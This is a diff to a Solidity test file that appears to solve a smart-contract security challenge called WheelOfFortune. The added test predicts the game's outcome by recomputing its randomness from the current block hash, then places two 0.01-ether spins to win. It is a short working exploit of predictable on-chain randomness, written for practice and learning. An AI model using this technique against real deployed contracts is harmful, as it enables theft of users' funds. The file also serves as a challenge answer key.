@@ -4,6 +4,7 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/03_WheelOfFortune/WheelOfFortune.sol";
 
+
 // forge test --match-contract WheelOfFortuneTest -vvvv
 contract WheelOfFortuneTest is BaseTest {
     WheelOfFortune instance;
@@ -15,9 +16,16 @@ contract WheelOfFortuneTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 bet = rand(blockhash(block.number), 100);
+
+        instance.spin{value: 0.01 ether}(bet);
+        instance.spin{value: 0.01 ether}(bet);
 
         checkSuccess();
+    }
+
+    function rand(bytes32 _hash, uint256 _max) internal pure returns (uint256 result) {
+        result = uint256(keccak256(abi.encode(_hash))) % _max;
     }
 
     function checkSuccess() internal view override {
